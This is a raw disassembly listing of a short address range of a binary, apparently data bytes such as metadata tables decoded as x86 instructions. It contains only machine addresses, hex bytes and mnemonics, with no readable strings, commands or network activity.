  404085:	00 31                	add    %dh,(%ecx)
  404087:	00 92 00 0a 00 11    	add    %dl,0x11000a00(%edx)
  40408d:	00 98 00 0e 00 11    	add    %bl,0x11000e00(%eax)
  404093:	00 a1 00 0e 00 16    	add    %ah,0x16000e00(%ecx)
  404099:	00 a9 00 0e 00 16    	add    %ch,0x16000e00(%ecx)
  40409f:	00 b5 00 11 00 16    	add    %dh,0x16001100(%ebp)
  4040a5:	00 c6                	add    %al,%dh
  4040a7:	00 0e                	add    %cl,(%esi)
  4040a9:	00 11                	add    %dl,(%ecx)
  4040ab:	00 dd                	add    %bl,%ch
  4040ad:	00 11                	add    %dl,(%ecx)
  4040af:	00 11                	add    %dl,(%ecx)
  4040b1:	00 e9                	add    %ch,%cl
  4040b3:	00 0e                	add    %cl,(%esi)
  4040b5:	00 11                	add    %dl,(%ecx)
  4040b7:	00 f4                	add    %dh,%ah
  4040b9:	00 11                	add    %dl,(%ecx)
  4040bb:	00 11                	add    %dl,(%ecx)
  4040bd:	00 05 01 0e 00 16    	add    %al,0x16000e01
  4040c3:	00 11                	add    %dl,(%ecx)
  4040c5:	01 0e                	add    %ecx,(%esi)
  4040c7:	00 11                	add    %dl,(%ecx)
  4040c9:	00 1e                	add    %bl,(%esi)
  4040cb:	01 11                	add    %edx,(%ecx)
  4040cd:	00 11                	add    %dl,(%ecx)
  4040cf:	00 31                	add    %dh,(%ecx)
  4040d1:	01 11                	add    %edx,(%ecx)
  4040d3:	00 11                	add    %dl,(%ecx)
  4040d5:	00 3c 01             	add    %bh,(%ecx,%eax,1)
  4040d8:	14 00                	adc    $0x0,%al
  4040da:	11 00                	adc    %eax,(%eax)
  4040dc:	49                   	dec    %ecx
  4040dd:	01 0e                	add    %ecx,(%esi)
  4040df:	00 16                	add    %dl,(%esi)
  4040e1:	00 55 01             	add    %dl,0x1(%ebp)
  4040e4:	0e                   	push   %cs
  4040e5:	00 11                	add    %dl,(%ecx)
  4040e7:	00 65 01             	add    %ah,0x1(%ebp)
  4040ea:	0e                   	push   %cs
  4040eb:	00 11                	add    %dl,(%ecx)
  4040ed:	00 7b 01             	add    %bh,0x1(%ebx)
  4040f0:	11 00                	adc    %eax,(%eax)
  4040f2:	11 00                	adc    %eax,(%eax)
  4040f4:	8f 01                	pop    (%ecx)
  4040f6:	11 00                	adc    %eax,(%eax)
  4040f8:	11 00                	adc    %eax,(%eax)
  4040fa:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4040fb:	01 11                	add    %edx,(%ecx)
  4040fd:	00 11                	add    %dl,(%ecx)
  4040ff:	00 c0                	add    %al,%al
  404101:	01 11                	add    %edx,(%ecx)
  404103:	00 11                	add    %dl,(%ecx)
  404105:	00 d9                	add    %bl,%cl
  404107:	01 11                	add    %edx,(%ecx)
  404109:	00 16                	add    %dl,(%esi)
  40410b:	00 ec                	add    %ch,%ah
  40410d:	01 0e                	add    %ecx,(%esi)
  40410f:	00 16                	add    %dl,(%esi)
  404111:	00 fd                	add    %bh,%ch
  404113:	01 0e                	add    %ecx,(%esi)
  404115:	00 16                	add    %dl,(%esi)
  404117:	00 07                	add    %al,(%edi)
  404119:	02 0e                	add    (%esi),%cl
  40411b:	00 16                	add    %dl,(%esi)
  40411d:	00 13                	add    %dl,(%ebx)
  40411f:	02 0e                	add    (%esi),%cl
  404121:	00 36                	add    %dh,(%esi)
  404123:	00 41 02             	add    %al,0x2(%ecx)
  404126:	17                   	pop    %ss
  404127:	00 11                	add    %dl,(%ecx)
  404129:	00 71 02             	add    %dh,0x2(%ecx)
  40412c:	1b 00                	sbb    (%eax),%eax
  40412e:	11 00                	adc    %eax,(%eax)
  404130:	7a 02                	jp     0x404134
  404132:	22 00                	and    (%eax),%al
  404134:	11 00                	adc    %eax,(%eax)
  404136:	d3 02                	roll   %cl,(%edx)
  404138:	3c 00                	cmp    $0x0,%al
  40413a:	11 00                	adc    %eax,(%eax)
  40413c:	c2 06 b7             	ret    $0xb706
  40413f:	00 11                	add    %dl,(%ecx)
  404141:	00 0f                	add    %cl,(%edi)
  404143:	07                   	pop    %es
  404144:	b7 00                	mov    $0x0,%bh
  404146:	56                   	push   %esi
  404147:	80 78 04 14          	cmpb   $0x14,0x4(%eax)
  40414b:	00 16                	add    %dl,(%esi)
  40414d:	00 a1 04 8b 00 11    	add    %ah,0x11008b04(%ecx)
  404153:	00 ab 04 0e 00 06    	add    %ch,0x6000e04(%ebx)
  404159:	00 2d 09 0e 00 13    	add    %ch,0x13000e09
  40415f:	01 68 0a             	add    %ebp,0xa(%eax)
  404162:	bf 01 13 01 44       	mov    $0x44011301,%edi
  404167:	0c bf                	or     $0xbf,%al
  404169:	01 06                	add    %eax,(%esi)
  40416b:	00 05 0d 0e 00 06    	add    %al,0x6000e0d
  404171:	00 7e 0f             	add    %bh,0xf(%esi)
  404174:	0e                   	push   %cs
  404175:	00 06                	add    %al,(%esi)
  404177:	00 14 06             	add    %dl,(%esi,%eax,1)
  40417a:	0e                   	push   %cs
  40417b:	00 00                	add    %al,(%eax)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	00 80 00 91 20 8a    	add    %al,-0x75df6f00(%eax)
  404185:	02 26                	add    (%esi),%ah
  404187:	00 01                	add    %al,(%ecx)
  404189:	00 60 20             	add    %ah,0x20(%eax)
  40418c:	00 00                	add    %al,(%eax)
  40418e:	00 00                	add    %al,(%eax)
  404190:	91                   	xchg   %eax,%ecx
  404191:	00 9f 02 2e 00 05    	add    %bl,0x5002e02(%edi)
  404197:	00 68 21             	add    %ch,0x21(%eax)
  40419a:	00 00                	add    %al,(%eax)
  40419c:	00 00                	add    %al,(%eax)
  40419e:	96                   	xchg   %eax,%esi
  40419f:	00 a4 02 34 00 06 00 	add    %ah,0x60034(%edx,%eax,1)
  4041a6:	74 21                	je     0x4041c9
  4041a8:	00 00                	add    %al,(%eax)
  4041aa:	00 00                	add    %al,(%eax)
  4041ac:	91                   	xchg   %eax,%ecx
  4041ad:	00 a8 02 34 00 06    	add    %ch,0x6003402(%eax)
  4041b3:	00 b4 21 00 00 00 00 	add    %dh,0x0(%ecx,%eiz,1)
  4041ba:	91                   	xchg   %eax,%ecx
  4041bb:	00 bd 02 38 00 06    	add    %bh,0x6003802(%ebp)
  4041c1:	00 38                	add    %bh,(%eax)
  4041c3:	22 00                	and    (%eax),%al
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 96 00 da 02 40    	add    %dl,0x4002da00(%esi)
  4041cd:	00 06                	add    %al,(%esi)
  4041cf:	00 88 22 00 00 00    	add    %cl,0x22(%eax)
  4041d5:	00 96 00 e7 02 40    	add    %dl,0x4002e700(%esi)
  4041db:	00 07                	add    %al,(%edi)
  4041dd:	00 ec                	add    %ch,%ah
  4041df:	22 00                	and    (%eax),%al
  4041e1:	00 00                	add    %al,(%eax)
  4041e3:	00 96 00 00 03 45    	add    %dl,0x45030000(%esi)
  4041e9:	00 08                	add    %cl,(%eax)
  4041eb:	00 28                	add    %ch,(%eax)
  4041ed:	23 00                	and    (%eax),%eax
  4041ef:	00 00                	add    %al,(%eax)
  4041f1:	00 91 00 13 03 4a    	add    %dl,0x4a031300(%ecx)
  4041f7:	00 09                	add    %cl,(%ecx)
  4041f9:	00 a4 24 00 00 00 00 	add    %ah,0x0(%esp)
  404200:	91                   	xchg   %eax,%ecx
  404201:	00 24 03             	add    %ah,(%ebx,%eax,1)
  404204:	4f                   	dec    %edi
  404205:	00 0a                	add    %cl,(%edx)
  404207:	00 00                	add    %al,(%eax)
  404209:	25 00 00 00 00       	and    $0x0,%eax
  40420e:	96                   	xchg   %eax,%esi
  40420f:	00 35 03 54 00 0b    	add    %dh,0xb005403
  404215:	00 58 25             	add    %bl,0x25(%eax)
  404218:	00 00                	add    %al,(%eax)
  40421a:	00 00                	add    %al,(%eax)
  40421c:	96                   	xchg   %eax,%esi
  40421d:	00 3c 03             	add    %bh,(%ebx,%eax,1)
  404220:	40                   	inc    %eax
  404221:	00 0b                	add    %cl,(%ebx)
  404223:	00 b0 25 00 00 00    	add    %dh,0x25(%eax)
  404229:	00 91 00 4b 03 58    	add    %dl,0x58034b00(%ecx)
  40422f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404232:	28 27                	sub    %ah,(%edi)
  404234:	00 00                	add    %al,(%eax)
  404236:	00 00                	add    %al,(%eax)
  404238:	91                   	xchg   %eax,%ecx
  404239:	00 57 03             	add    %dl,0x3(%edi)
  40423c:	5f                   	pop    %edi
  40423d:	00 0f                	add    %cl,(%edi)
  40423f:	00 3c 28             	add    %bh,(%eax,%ebp,1)
  404242:	00 00                	add    %al,(%eax)
  404244:	00 00                	add    %al,(%eax)
  404246:	91                   	xchg   %eax,%ecx
  404247:	00 69 03             	add    %ch,0x3(%ecx)
  40424a:	65 00 11             	add    %dl,%gs:(%ecx)
  40424d:	00 a0 28 00 00 00    	add    %ah,0x28(%eax)
  404253:	00 96 00 7b 03 6c    	add    %dl,0x6c037b00(%esi)
  404259:	00 14 00             	add    %dl,(%eax,%eax,1)
  40425c:	ec                   	in     (%dx),%al
  40425d:	28 00                	sub    %al,(%eax)
  40425f:	00 00                	add    %al,(%eax)
  404261:	00 96 00 8e 03 71    	add    %dl,0x71038e00(%esi)
  404267:	00 14 00             	add    %dl,(%eax,%eax,1)
  40426a:	7c 29                	jl     0x404295
  40426c:	00 00                	add    %al,(%eax)
  40426e:	00 00                	add    %al,(%eax)
  404270:	91                   	xchg   %eax,%ecx
  404271:	00 9a 03 34 00 16    	add    %bl,0x16003403(%edx)
  404277:	00 88 2a 00 00 00    	add    %cl,0x2a(%eax)
  40427d:	00 91 00 ad 03 4a    	add    %dl,0x4a03ad00(%ecx)
  404283:	00 16                	add    %dl,(%esi)
  404285:	00 90 2b 00 00 00    	add    %dl,0x2b(%eax)
  40428b:	00 91 00 b9 03 4a    	add    %dl,0x4a03b900(%ecx)
  404291:	00 17                	add    %dl,(%edi)
  404293:	00 e0                	add    %ah,%al
  404295:	2c 00                	sub    $0x0,%al
  404297:	00 00                	add    %al,(%eax)
  404299:	00 91 00 cc 03 34    	add    %dl,0x3403cc00(%ecx)
  40429f:	00 18                	add    %bl,(%eax)
  4042a1:	00 84 2d 00 00 00 00 	add    %al,0x0(%ebp,%ebp,1)
  4042a8:	91                   	xchg   %eax,%ecx
  4042a9:	00 dd                	add    %bl,%ch
  4042ab:	03 34 00             	add    (%eax,%eax,1),%esi
  4042ae:	18 00                	sbb    %al,(%eax)
  4042b0:	e4 2d                	in     $0x2d,%al
  4042b2:	00 00                	add    %al,(%eax)
  4042b4:	00 00                	add    %al,(%eax)
  4042b6:	91                   	xchg   %eax,%ecx
  4042b7:	00 ec                	add    %ch,%ah
  4042b9:	03 38                	add    (%eax),%edi
  4042bb:	00 18                	add    %bl,(%eax)
  4042bd:	00 64 2e 00          	add    %ah,0x0(%esi,%ebp,1)
  4042c1:	00 00                	add    %al,(%eax)
  4042c3:	00 91 00 f3 03 34    	add    %dl,0x3403f300(%ecx)
  4042c9:	00 18                	add    %bl,(%eax)
  4042cb:	00 ac 2e 00 00 00 00 	add    %ch,0x0(%esi,%ebp,1)
  4042d2:	91                   	xchg   %eax,%ecx
  4042d3:	00 03                	add    %al,(%ebx)
  4042d5:	04 4a                	add    $0x4a,%al
  4042d7:	00 18                	add    %bl,(%eax)
  4042d9:	00 28                	add    %ch,(%eax)
  4042db:	2f                   	das
  4042dc:	00 00                	add    %al,(%eax)
  4042de:	00 00                	add    %al,(%eax)
  4042e0:	91                   	xchg   %eax,%ecx
  4042e1:	00 0c 04             	add    %cl,(%esp,%eax,1)
  4042e4:	4a                   	dec    %edx
  4042e5:	00 19                	add    %bl,(%ecx)
  4042e7:	00 78 2f             	add    %bh,0x2f(%eax)
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	91                   	xchg   %eax,%ecx
  4042ef:	00 17                	add    %dl,(%edi)
  4042f1:	04 34                	add    $0x34,%al
  4042f3:	00 1a                	add    %bl,(%edx)
  4042f5:	00 84 2f 00 00 00 00 	add    %al,0x0(%edi,%ebp,1)
  4042fc:	91                   	xchg   %eax,%ecx
  4042fd:	00 2a                	add    %ch,(%edx)
  4042ff:	04 34                	add    $0x34,%al
  404301:	00 1a                	add    %bl,(%edx)
  404303:	00 90 2f 00 00 00    	add    %dl,0x2f(%eax)
  404309:	00 91 00 3e 04 34    	add    %dl,0x34043e00(%ecx)
  40430f:	00 1a                	add    %bl,(%edx)
  404311:	00 9c 2f 00 00 00 00 	add    %bl,0x0(%edi,%ebp,1)
  404318:	96                   	xchg   %eax,%esi
  404319:	00 52 04             	add    %dl,0x4(%edx)
  40431c:	34 00                	xor    $0x0,%al
  40431e:	1a 00                	sbb    (%eax),%al
  404320:	e4 2f                	in     $0x2f,%al
  404322:	00 00                	add    %al,(%eax)
  404324:	00 00                	add    %al,(%eax)
  404326:	96                   	xchg   %eax,%esi
  404327:	00 65 04             	add    %ah,0x4(%ebp)
  40432a:	4a                   	dec    %edx
  40432b:	00 1a                	add    %bl,(%edx)
  40432d:	00 5f 3b             	add    %bl,0x3b(%edi)
  404330:	00 00                	add    %al,(%eax)
  404332:	00 00                	add    %al,(%eax)
  404334:	86 18                	xchg   %bl,(%eax)
  404336:	72 04                	jb     0x40433c
  404338:	77 00                	ja     0x40433a
  40433a:	1b 00                	sbb    (%eax),%eax
  40433c:	50                   	push   %eax
  40433d:	20 00                	and    %al,(%eax)
  40433f:	00 00                	add    %al,(%eax)
  404341:	00 91 00 9a 06 34    	add    %dl,0x34069a00(%ecx)
  404347:	00 1b                	add    %bl,(%ebx)
  404349:	00 57 20             	add    %dl,0x20(%edi)
  40434c:	00 00                	add    %al,(%eax)
  40434e:	00 00                	add    %al,(%eax)
  404350:	91                   	xchg   %eax,%ecx
  404351:	00 04 07             	add    %al,(%edi,%eax,1)
  404354:	34 00                	xor    $0x0,%al
  404356:	1b 00                	sbb    (%eax),%eax
  404358:	44                   	inc    %esp
  404359:	30 00                	xor    %al,(%eax)
  40435b:	00 00                	add    %al,(%eax)
  40435d:	00 91 18 f6 0e 34    	add    %dl,0x340ef618(%ecx)
  404363:	00 1b                	add    %bl,(%ebx)
  404365:	00 00                	add    %al,(%eax)
  404367:	00 00                	add    %al,(%eax)
  404369:	00 80 00 96 20 7c    	add    %al,0x7c209600(%eax)
  40436f:	04 80                	add    $0x80,%al
  404371:	00 1b                	add    %bl,(%ebx)
  404373:	00 00                	add    %al,(%eax)
  404375:	00 00                	add    %al,(%eax)
  404377:	00 80 00 96 20 97    	add    %al,-0x68df6a00(%eax)
  40437d:	04 85                	add    $0x85,%al
  40437f:	00 1d 00 67 3b 00    	add    %bl,0x3b6700
  404385:	00 00                	add    %al,(%eax)
  404387:	00 91 18 f6 0e 34    	add    %dl,0x340ef618(%ecx)
  40438d:	00 1f                	add    %bl,(%edi)
  40438f:	00 75 3b             	add    %dh,0x3b(%ebp)
  404392:	00 00                	add    %al,(%eax)
  404394:	00 00                	add    %al,(%eax)
  404396:	86 18                	xchg   %bl,(%eax)
  404398:	72 04                	jb     0x40439e
  40439a:	77 00                	ja     0x40439c
  40439c:	1f                   	pop    %ds
  40439d:	00 7d 3b             	add    %bh,0x3b(%ebp)
  4043a0:	00 00                	add    %al,(%eax)
  4043a2:	00 00                	add    %al,(%eax)
  4043a4:	86 18                	xchg   %bl,(%eax)
  4043a6:	72 04                	jb     0x4043ac
  4043a8:	77 00                	ja     0x4043aa
  4043aa:	1f                   	pop    %ds
  4043ab:	00 a2 3b 00 00 00    	add    %ah,0x3b(%edx)
  4043b1:	00 81 00 bc 04 8e    	add    %al,-0x71fb4400(%ecx)
  4043b7:	00 1f                	add    %bl,(%edi)
  4043b9:	00 bc 3b 00 00 00 00 	add    %bh,0x0(%ebx,%edi,1)
  4043c0:	c4 00                	les    (%eax),%eax
  4043c2:	d0 04 94             	rolb   $1,(%esp,%edx,4)
  4043c5:	00 20                	add    %ah,(%eax)
  4043c7:	00 70 3c             	add    %dh,0x3c(%eax)
  4043ca:	00 00                	add    %al,(%eax)
  4043cc:	00 00                	add    %al,(%eax)
  4043ce:	c4 08                	les    (%eax),%ecx
  4043d0:	e5 04                	in     $0x4,%eax
  4043d2:	9b                   	fwait
  4043d3:	00 21                	add    %ah,(%ecx)
  4043d5:	00 ac 3c 00 00 00 00 	add    %ch,0x0(%esp,%edi,1)
  4043dc:	96                   	xchg   %eax,%esi
  4043dd:	00 f6                	add    %dh,%dh
  4043df:	04 54                	add    $0x54,%al
  4043e1:	00 21                	add    %ah,(%ecx)
  4043e3:	00 0c 3d 00 00 00 00 	add    %cl,0x0(,%edi,1)
  4043ea:	96                   	xchg   %eax,%esi
  4043eb:	00 fe                	add    %bh,%dh
  4043ed:	04 4a                	add    $0x4a,%al
  4043ef:	00 21                	add    %ah,(%ecx)
  4043f1:	00 4b 3d             	add    %cl,0x3d(%ebx)
  4043f4:	00 00                	add    %al,(%eax)
  4043f6:	00 00                	add    %al,(%eax)
  4043f8:	91                   	xchg   %eax,%ecx
  4043f9:	18 f6                	sbb    %dh,%dh
  4043fb:	0e                   	push   %cs
  4043fc:	34 00                	xor    $0x0,%al
  4043fe:	22 00                	and    (%eax),%al
  404400:	0b 23                	or     (%ebx),%esp
  404402:	00 00                	add    %al,(%eax)
  404404:	00 00                	add    %al,(%eax)
  404406:	86 18                	xchg   %bl,(%eax)
  404408:	72 04                	jb     0x40440e
  40440a:	77 00                	ja     0x40440c
  40440c:	22 00                	and    (%eax),%al
  40440e:	13 23                	adc    (%ebx),%esp
  404410:	00 00                	add    %al,(%eax)
  404412:	00 00                	add    %al,(%eax)
  404414:	86 00                	xchg   %al,(%eax)
  404416:	37                   	aaa
  404417:	09 48 01             	or     %ecx,0x1(%eax)
  40441a:	22 00                	and    (%eax),%al
  40441c:	64 29 00             	sub    %eax,%fs:(%eax)
  40441f:	00 00                	add    %al,(%eax)
  404421:	00 86 18 72 04 77    	add    %al,0x77047218(%esi)
  404427:	00 23                	add    %ah,(%ebx)
  404429:	00 6c 29 00          	add    %ch,0x0(%ecx,%ebp,1)
  40442d:	00 00                	add    %al,(%eax)
  40442f:	00 86 00 0d 0d 48    	add    %al,0x480d0d00(%esi)
  404435:	01 23                	add    %esp,(%ebx)
  404437:	00 97 3c 00 00 00    	add    %dl,0x3c(%edi)
  40443d:	00 86 18 72 04 77    	add    %al,0x77047218(%esi)
  404443:	00 24 00             	add    %ah,(%eax,%eax,1)
  404446:	9f                   	lahf
  404447:	3c 00                	cmp    $0x0,%al
  404449:	00 00                	add    %al,(%eax)
  40444b:	00 86 00 8a 0f 77    	add    %al,0x770f8a00(%esi)
  404451:	00 24 00             	add    %ah,(%eax,%eax,1)
  404454:	f5                   	cmc
  404455:	3c 00                	cmp    $0x0,%al
  404457:	00 00                	add    %al,(%eax)
  404459:	00 86 18 72 04 77    	add    %al,0x77047218(%esi)
  40445f:	00 24 00             	add    %ah,(%eax,%eax,1)
  404462:	fd                   	std
  404463:	3c 00                	cmp    $0x0,%al
  404465:	00 00                	add    %al,(%eax)
  404467:	00 86 00 e1 0f 77    	add    %al,0x770fe100(%esi)
  40446d:	00 24 00             	add    %ah,(%eax,%eax,1)
  404470:	00 00                	add    %al,(%eax)
  404472:	01 00                	add    %eax,(%eax)
  404474:	06                   	push   %es
  404475:	05 00 00 02 00       	add    $0x20000,%eax
  40447a:	0d 05 00 00 03       	or     $0x3000005,%eax
  40447f:	00 14 05 00 00 04 00 	add    %dl,0x40000(,%eax,1)
  404486:	1b 05 00 00 01 00    	sbb    0x10000,%eax
  40448c:	22 05 00 00 01 00    	and    0x10000,%al
  404492:	27                   	daa
  404493:	05 00 00 01 00       	add    $0x10000,%eax
  404498:	27                   	daa
  404499:	05 00 00 01 00       	add    $0x10000,%eax
  40449e:	2e 05 00 00 01 00    	cs add $0x10000,%eax
  4044a4:	38 05 00 00 01 00    	cmp    %al,0x10000
  4044aa:	41                   	inc    %ecx
  4044ab:	05 00 00 01 00       	add    $0x10000,%eax
  4044b0:	27                   	daa
  4044b1:	05 00 00 01 00       	add    $0x10000,%eax
  4044b6:	4b                   	dec    %ebx
  4044b7:	05 00 00 02 00       	add    $0x20000,%eax
  4044bc:	55                   	push   %ebp
  4044bd:	05 00 00 03 00       	add    $0x30000,%eax
  4044c2:	5e                   	pop    %esi
  4044c3:	05 00 00 01 00       	add    $0x10000,%eax
  4044c8:	4b                   	dec    %ebx
  4044c9:	05 00 00 02 00       	add    $0x20000,%eax
  4044ce:	65 05 00 00 01 00    	gs add $0x10000,%eax
  4044d4:	4b                   	dec    %ebx
  4044d5:	05 00 00 02 00       	add    $0x20000,%eax
  4044da:	55                   	push   %ebp
  4044db:	05 00 00 03 00       	add    $0x30000,%eax
  4044e0:	73 05                	jae    0x4044e7
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	01 00                	add    %eax,(%eax)
  4044e6:	7f 05                	jg     0x4044ed
  4044e8:	00 00                	add    %al,(%eax)
  4044ea:	02 00                	add    (%eax),%al
  4044ec:	8d 05 00 00 01 00    	lea    0x10000,%eax
  4044f2:	05 01 00 00 01       	add    $0x1000001,%eax
  4044f7:	00 05 01 00 00 01    	add    %al,0x1000001
  4044fd:	00 e9                	add    %ch,%cl
  4044ff:	00 00                	add    %al,(%eax)
  404501:	00 01                	add    %al,(%ecx)
  404503:	00 9d 05 00 00 01    	add    %bl,0x1000005(%ebp)
  404509:	00 a6 05 00 20 00    	add    %ah,0x200005(%esi)
  40450f:	00 00                	add    %al,(%eax)
  404511:	00 00                	add    %al,(%eax)
  404513:	00 01                	add    %al,(%ecx)
  404515:	00 ed                	add    %ch,%ch
  404517:	05 00 00 01 00       	add    $0x10000,%eax
  40451c:	f2 05 00 00 02 00    	repnz add $0x20000,%eax
  404522:	fc                   	cld
  404523:	05 00 00 01 00       	add    $0x10000,%eax
  404528:	0a 06                	or     (%esi),%al
  40452a:	00 00                	add    %al,(%eax)
  40452c:	01 00                	add    %eax,(%eax)
  40452e:	12 06                	adc    (%esi),%al
  404530:	00 00                	add    %al,(%eax)
  404532:	01 00                	add    %eax,(%eax)
  404534:	14 06                	adc    $0x6,%al
  404536:	00 00                	add    %al,(%eax)
  404538:	01 00                	add    %eax,(%eax)
  40453a:	4e                   	dec    %esi
  40453b:	09 00                	or     %eax,(%eax)
  40453d:	00 01                	add    %al,(%ecx)
  40453f:	00 4e 09             	add    %cl,0x9(%esi)
  404542:	41                   	inc    %ecx
  404543:	00 72 04             	add    %dh,0x4(%edx)
  404546:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  404547:	00 51 00             	add    %dl,0x0(%ecx)
  40454a:	72 04                	jb     0x404550
  40454c:	ad                   	lods   %ds:(%esi),%eax
  40454d:	00 59 00             	add    %bl,0x0(%ecx)
  404550:	72 04                	jb     0x404556
  404552:	77 00                	ja     0x404554
  404554:	61                   	popa
  404555:	00 72 04             	add    %dh,0x4(%edx)
  404558:	b2 00                	mov    $0x0,%dl
  40455a:	71 00                	jno    0x40455c
  40455c:	72 04                	jb     0x404562
  40455e:	77 00                	ja     0x404560
  404560:	69 00 72 04 c0 00    	imul   $0xc00472,(%eax),%eax
  404566:	79 00                	jns    0x404568
  404568:	72 04                	jb     0x40456e
  40456a:	c6 00 79             	movb   $0x79,(%eax)
  40456d:	00 3d 07 77 00 81    	add    %bh,0x81007707
  404573:	00 4f 07             	add    %cl,0x7(%edi)
  404576:	cc                   	int3
  404577:	00 89 00 a4 02 d1    	add    %cl,-0x2efd5c00(%ecx)
  40457d:	00 91 00 7b 07 d7    	add    %dl,-0x28f88500(%ecx)
  404583:	00 91 00 8c 07 dc    	add    %dl,-0x23f87400(%ecx)
  404589:	00 99 00 a8 07 45    	add    %bl,0x4507a800(%ecx)
  40458f:	00 81 00 c7 07 e0    	add    %al,-0x1ff83900(%ecx)
  404595:	00 a9 00 dc 07 e6    	add    %ch,-0x19f82400(%ecx)
  40459b:	00 79 00             	add    %bh,0x0(%ecx)
  40459e:	ea 07 cc 00 b1 00 0b 	ljmp   $0xb00,$0xb100cc07
  4045a5:	08 f1                	or     %dh,%cl
  4045a7:	00 b1 00 18 08 f7    	add    %dh,-0x8f7e800(%ecx)
  4045ad:	00 b1 00 42 08 fc    	add    %dh,-0x3f7be00(%ecx)
  4045b3:	00 b9 00 5c 08 01    	add    %bh,0x1085c00(%ecx)
  4045b9:	01 c1                	add    %eax,%ecx
  4045bb:	00 65 08             	add    %ah,0x8(%ebp)
  4045be:	dc 00                	faddl  (%eax)
  4045c0:	91                   	xchg   %eax,%ecx
  4045c1:	00 72 08             	add    %dh,0x8(%edx)
  4045c4:	d7                   	xlat   %ds:(%ebx)
  4045c5:	00 a9 00 87 08 e6    	add    %ch,-0x19f77900(%ecx)
  4045cb:	00 b1 00 93 08 07    	add    %dh,0x7089300(%ecx)
  4045d1:	01 d1                	add    %edx,%ecx
  4045d3:	00 72 04             	add    %dh,0x4(%edx)
  4045d6:	77 00                	ja     0x4045d8
  4045d8:	a9 00 be 08 07       	test   $0x708be00,%eax
  4045dd:	01 29                	add    %ebp,(%ecx)
  4045df:	00 c9                	add    %cl,%cl
  4045e1:	08 1a                	or     %bl,(%edx)
  4045e3:	01 a9 00 ce 08 20    	add    %ebp,0x2008ce00(%ecx)
  4045e9:	01 d1                	add    %edx,%ecx
  4045eb:	00 d8                	add    %bl,%al
  4045ed:	08 25 01 09 00 df    	or     %ah,0xdf000901
  4045f3:	08 dc                	or     %bl,%ah
  4045f5:	00 d9                	add    %bl,%cl
  4045f7:	00 f1                	add    %dh,%cl
  4045f9:	08 32                	or     %dh,(%edx)
  4045fb:	01 d9                	add    %ebx,%ecx
  4045fd:	00 fa                	add    %bh,%dl
  4045ff:	08 37                	or     %dh,(%edi)
  404601:	01 e1                	add    %esp,%ecx
  404603:	00 0b                	add    %cl,(%ebx)
  404605:	09 3d 01 09 00 72    	or     %edi,0x72000901
  40460b:	04 77                	add    $0x77,%al
  40460d:	00 a9 00 50 09 dc    	add    %ch,-0x23f6b000(%ecx)
  404613:	00 e9                	add    %ch,%cl
  404615:	00 62 09             	add    %ah,0x9(%edx)
  404618:	4d                   	dec    %ebp
  404619:	01 99 00 6b 09 45    	add    %ebx,0x45096b00(%ecx)
  40461f:	00 99 00 78 09 45    	add    %bl,0x45097800(%ecx)
  404625:	00 0c 00             	add    %cl,(%eax,%eax,1)
  404628:	72 04                	jb     0x40462e
  40462a:	c0 00 f9             	rolb   $0xf9,(%eax)
  40462d:	00 96 09 59 01 01    	add    %dl,0x1015909(%esi)
  404633:	01 72 04             	add    %esi,0x4(%edx)
  404636:	b2 00                	mov    $0x0,%dl
  404638:	09 01                	or     %eax,(%ecx)
  40463a:	c4 09                	les    (%ecx),%ecx
  40463c:	6b 01 01             	imul   $0x1,(%ecx),%eax
  40463f:	01 be 08 72 01 a9    	add    %edi,-0x56fe8df8(%esi)
  404645:	00 d3                	add    %dl,%bl
  404647:	09 76 01             	or     %esi,0x1(%esi)
  40464a:	19 01                	sbb    %eax,(%ecx)
  40464c:	96                   	xchg   %eax,%esi
  40464d:	09 4f 00             	or     %ecx,0x0(%edi)
  404650:	19 01                	sbb    %eax,(%ecx)
  404652:	ed                   	in     (%dx),%eax
  404653:	09 7d 01             	or     %edi,0x1(%ebp)
  404656:	e9 00 fb 09 4d       	jmp    0x4d4a415b
  40465b:	01 a9 00 0a 0a 48    	add    %ebp,0x480a0a00(%ecx)
  404661:	01 d1                	add    %edx,%ecx
  404663:	00 13                	add    %dl,(%ebx)
  404665:	0a a8 01 29 00 72    	or     0x72002901(%eax),%ch
  40466b:	04 77                	add    $0x77,%al
  40466d:	00 29                	add    %ch,(%ecx)
  40466f:	00 c9                	add    %cl,%cl
  404671:	08 b3 01 31 01 9e    	or     %dh,-0x61feceff(%ebx)
  404677:	0a c2                	or     %dl,%al
  404679:	01 41 01             	add    %eax,0x1(%ecx)
  40467c:	72 04                	jb     0x404682
  40467e:	cb                   	lret
  40467f:	01 51 01             	add    %edx,0x1(%ecx)
  404682:	72 04                	jb     0x404688
  404684:	77 00                	ja     0x404686
  404686:	59                   	pop    %ecx
  404687:	01 02                	add    %eax,(%edx)
  404689:	0b ad 00 59 01 0e    	or     0xe015900(%ebp),%ebp
  40468f:	0b ad 00 59 01 28    	or     0x28015900(%ebp),%ebp
  404695:	0b d3                	or     %ebx,%edx
  404697:	01 69 01             	add    %ebp,0x1(%ecx)
  40469a:	72 04                	jb     0x4046a0
  40469c:	da 01                	fiaddl (%ecx)
  40469e:	59                   	pop    %ecx
  40469f:	01 47 0b             	add    %eax,0xb(%edi)
  4046a2:	07                   	pop    %es
  4046a3:	01 71 01             	add    %esi,0x1(%ecx)
  4046a6:	fa                   	cli
  4046a7:	08 e3                	or     %ah,%bl
  4046a9:	01 59 01             	add    %ebx,0x1(%ecx)
  4046ac:	5f                   	pop    %edi
  4046ad:	0b e9                	or     %ecx,%ebp
  4046af:	01 59 01             	add    %ebx,0x1(%ecx)
  4046b2:	67 0b 07             	or     (%bx),%eax
  4046b5:	01 59 01             	add    %ebx,0x1(%ecx)
  4046b8:	75 0b                	jne    0x4046c5
  4046ba:	e9 01 59 01 87       	jmp    0x87419fc0
  4046bf:	0b ef                	or     %edi,%ebp
  4046c1:	01 81 01 97 0b f6    	add    %eax,-0x9f468ff(%ecx)
  4046c7:	01 59 01             	add    %ebx,0x1(%ecx)
  4046ca:	ae                   	scas   %es:(%edi),%al
  4046cb:	0b fe                	or     %esi,%edi
  4046cd:	01 91 01 72 04 04    	add    %edx,0x4047201(%ecx)
  4046d3:	02 81 01 dc 0b 11    	add    0x110bdc01(%ecx),%al
